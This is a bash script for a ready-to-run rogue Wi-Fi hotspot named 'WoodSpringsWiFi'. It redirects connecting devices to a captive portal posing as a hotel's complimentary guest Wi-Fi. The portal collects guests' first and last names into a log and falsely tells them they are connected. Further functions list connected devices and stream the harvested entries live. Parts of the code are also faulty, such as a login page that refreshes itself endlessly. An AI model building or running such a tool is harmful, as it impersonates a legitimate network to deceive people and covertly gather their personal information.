#!/bin/bash

PORTAL_DIR="portal"
LOG_FILE="logs/log.txt"
HOTSPOT_IFACE="wlp4s0"
SSID="WoodSpringsWiFi"

HOSTAPD_CONF="/tmp/hostapd.conf"
DNSMASQ_CONF="/tmp/dnsmasq.conf"

# ---------------------------
# Ensure portal and logs exist
# ---------------------------
ensure_directories() {
    mkdir -p "$PORTAL_DIR"
    mkdir -p "logs"

    # index.php for captive portal
    if [ ! -f "$PORTAL_DIR/index.php" ]; then
cat > "$PORTAL_DIR/index.php" <<'EOF'
<?php
// Redirect iOS/Android/Windows captive portal URLs
$redirectPaths = ['/hotspot-detect.html','/generate_204','/connecttest.txt','/ncsi.txt'];
if (in_array($_SERVER['REQUEST_URI'], $redirectPaths)) {
    header("Location: /index.php");
    exit;
}

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $firstname = $_POST['firstname'] ?? '';
    $lastname = $_POST['lastname'] ?? '';
    file_put_contents('../logs/log.txt', date('Y-m-d H:i:s') . " - FIRSTNAME: $firstname LASTNAME: $lastname\n", FILE_APPEND);

    // Show connected page
    echo "<!DOCTYPE html>
<html>
<head>
<meta charset='UTF-8'>
<title>Connected</title>
<style>
body { display:flex; justify-content:center; align-items:center; height:100vh; font-family:Arial,sans-serif; background:linear-gradient(to right,#1e3c72,#2a5298); color:#fff; }
.message { background:#fff; color:#333; padding:30px; border-radius:12px; width:320px; text-align:center; box-shadow:0 10px 25px rgba(0,0,0,0.3);}
</style>
</head>
<body>
<div class='message'>
<h1>Connected!</h1>
<p>Welcome, $firstname $lastname</p>
<p>You now have access to WoodSprings Guest Wi‑Fi.</p>
</div>
</body>
</html>";
    exit;
}

// Default: show login page
include("index.html");
EOF
    fi

    # WoodSprings login page
    if [ ! -f "$PORTAL_DIR/index.html" ]; then
cat > "$PORTAL_DIR/index.html" <<'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>WoodSprings Guest Wi‑Fi</title>
<meta http-equiv="refresh" content="0; url=index.html">
<style>
body { margin:0; font-family:Arial,sans-serif; background:linear-gradient(to right,#1e3c72,#2a5298); color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; }
.container { background:#fff; color:#333; padding:30px; border-radius:12px; width:320px; box-shadow:0 10px 25px rgba(0,0,0,0.3); text-align:center; }
.logo { font-size:24px; font-weight:bold; margin-bottom:10px; color:#2a5298; }
.subtitle { font-size:14px; margin-bottom:20px; color:#666; }
input { width:100%; padding:10px; margin:8px 0; border-radius:6px; border:1px solid #ccc; }
button { width:100%; padding:10px; background:#2a5298; color:#fff; border:none; border-radius:6px; cursor:pointer; font-weight:bold; }
button:hover { background:#1e3c72; }
.footer { margin-top:15px; font-size:12px; color:#999; }
</style>
</head>
<body>
<div class="container">
<div class="logo">WoodSprings</div>
<div class="subtitle">Guest Wi‑Fi Access</div>
<form method="POST">
<input type="text" name="firstname" placeholder="First Name" required>
<input type="text" name="lastname" placeholder="Last Name" required>
<button type="submit">Connect</button>
</form>
<div class="footer">Complimentary internet for hotel guests</div>
</div>
</body>
</html>
EOF
    fi

    touch "$LOG_FILE"
}

# ---------------------------
# Setup dependencies
# ---------------------------
setup() {
    echo "[+] Installing dependencies..."
    sudo apt update
    sudo apt install hostapd dnsmasq php-cli iptables -y
    echo "[+] Setup complete!"
}

# ---------------------------
# Hostapd & dnsmasq config
# ---------------------------
create_configs() {
cat > $HOSTAPD_CONF <<EOF
interface=$HOTSPOT_IFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=6
auth_algs=1
ignore_broadcast_ssid=0
EOF

cat > $DNSMASQ_CONF <<EOF
interface=$HOTSPOT_IFACE
dhcp-range=192.168.50.2,192.168.50.50,255.255.255.0,12h
EOF
}

# ---------------------------
# Start hotspot + captive portal
# ---------------------------
start_hotspot() {
    ensure_directories
    echo "[+] Starting hotspot on $HOTSPOT_IFACE..."
    create_configs

    sudo ip link set $HOTSPOT_IFACE down
    sudo ip addr flush dev $HOTSPOT_IFACE
    sudo ip addr add 192.168.50.1/24 dev $HOTSPOT_IFACE
    sudo ip link set $HOTSPOT_IFACE up

    sudo sysctl -w net.ipv4.ip_forward=1
    sudo hostapd $HOSTAPD_CONF -B
    sudo dnsmasq -C $DNSMASQ_CONF

    sudo iptables -t nat -A PREROUTING -i $HOTSPOT_IFACE -p tcp --dport 80 -j DNAT --to-destination 192.168.50.1:80
    sudo iptables -t nat -A POSTROUTING -o $HOTSPOT_IFACE -j MASQUERADE

    echo "[+] Hotspot started. Devices should see 'Wi-Fi Needs a Login' popup."

    # Start login page server automatically in background
    start_server
}

stop_hotspot() {
    echo "[+] Stopping hotspot..."
    sudo pkill hostapd
    sudo pkill dnsmasq
    sudo iptables -t nat -F
    sudo iptables -t nat -X
    sudo sysctl -w net.ipv4.ip_forward=0
    echo "[+] Hotspot stopped."
}

# ---------------------------
# Start PHP login page server in background (iPhone-ready)
# ---------------------------
start_server() {
    ensure_directories
    echo "[+] Starting login page server in background on port 80..."
    cd "$PORTAL_DIR" || exit
    php -S 0.0.0.0:80 > /dev/null 2>&1 &
    echo "[+] Login page server running!"
}

show_devices() { cat /var/lib/misc/dnsmasq.leases 2>/dev/null; }
view_logs() { cat "$LOG_FILE"; }
live_logs() { tail -f "$LOG_FILE"; }

edit_page() {
    ensure_directories
    nano "$PORTAL_DIR/index.html"
}

# ---------------------------
# Main Menu
# ---------------------------
while true; do
echo ""
echo "====== Captive Portal Number Tool ======"
echo "1) Setup Dependencies"
echo "2) Start Hotspot + Captive Portal"
echo "3) Stop Hotspot"
echo "4) Start Login Page Server (Background)"
echo "5) Show Connected Devices"
echo "6) View Logs"
echo "7) Live Logs"
echo "8) Edit Login Page"
echo "9) Exit"
echo "======================================="
read -p "Select option: " choice

case $choice in
1) setup ;;
2) start_hotspot ;;
3) stop_hotspot ;;
4) start_server ;;
5) show_devices ;;
6) view_logs ;;
7) live_logs ;;
8) edit_page ;;
9) exit ;;
*) echo "Invalid option" ;;
esac
done
